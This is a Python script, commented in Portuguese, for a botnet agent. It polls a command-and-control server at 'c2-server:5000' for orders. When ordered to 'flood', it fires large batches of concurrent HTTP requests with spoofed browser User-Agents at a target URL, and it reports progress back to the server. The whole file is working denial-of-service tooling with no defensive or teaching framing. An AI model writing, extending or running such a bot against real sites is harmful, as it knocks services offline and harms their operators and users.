import asyncio
import aiohttp
import requests
import uuid
import random

# 1. CONSTANTES (Devem vir logo após os imports)
C2_URL = "http://c2-server:5000"
BOT_ID = f"bot-{uuid.uuid4().hex[:6]}"

# 2. FUNÇÕES DE SUPORTE (Devem vir antes de serem chamadas)

async def send_log(message):
    """Envia logs de progresso para o C2"""
    try:
        # Usamos requests para o log de forma síncrona para simplificar
        requests.post(f"{C2_URL}/report_log", json={"bot_id": BOT_ID, "message": message}, timeout=2)
    except Exception:
        pass

async def attack_task(session, target_url):
    """Realiza uma única requisição HTTP assíncrona"""
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    try:
        async with session.get(target_url, headers=headers, timeout=5) as response:
            return response.status
    except Exception:
        return None

async def flood_target(target_url, intensity):
    """Gerencia o lote de requisições assíncronas"""
    await send_log(f"INICIANDO ATAQUE: {target_url} (Intensidade: {intensity})")
    
    connector = aiohttp.TCPConnector(limit=None)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(intensity):
            tasks.append(asyncio.create_task(attack_task(session, target_url)))
        
        if tasks:
            await asyncio.gather(*tasks)
    
    await send_log(f"LOTE FINALIZADO em {target_url}")

# 3. LÓGICA PRINCIPAL (O loop de vida do bot)

async def main():
    # ... (mantenha o código de registro igual)

    print(f"[*] Agente {BOT_ID} online e aguardando ordens...")

    while True:
        try:
            response = requests.get(f"{C2_URL}/get_task/{BOT_ID}", timeout=5)
            
            if response.status_code == 200:
                order = response.json().get("task")
                
                if order and order.get("action") == "flood":
                    # 1. Removemos o sleep longo aqui
                    # 2. Chamamos o ataque de forma que ele mantenha a pressão
                    target = order.get("target_url")
                    intensity = order.get("intensity", 10)
                    
                    # Dispara o ataque e NÃO espera o fim para continuar o loop se quiser pressão máxima
                    # Ou apenas diminua o sleep drasticamente
                    await flood_target(target, intensity)
                    
                    # Em vez de 3 segundos, esperamos apenas milissegundos
                    await asyncio.sleep(0.1) 
                else:
                    # Se não tem ordem, aí sim ele dorme para não fritar seu PC
                    await asyncio.sleep(3)
            else:
                await asyncio.sleep(3)
        except Exception as e:
            print(f"[!] Erro: {e}")
            await asyncio.sleep(2)


# 4. PONTO DE ENTRADA DO SCRIPT
if __name__ == "__main__":
    asyncio.run(main())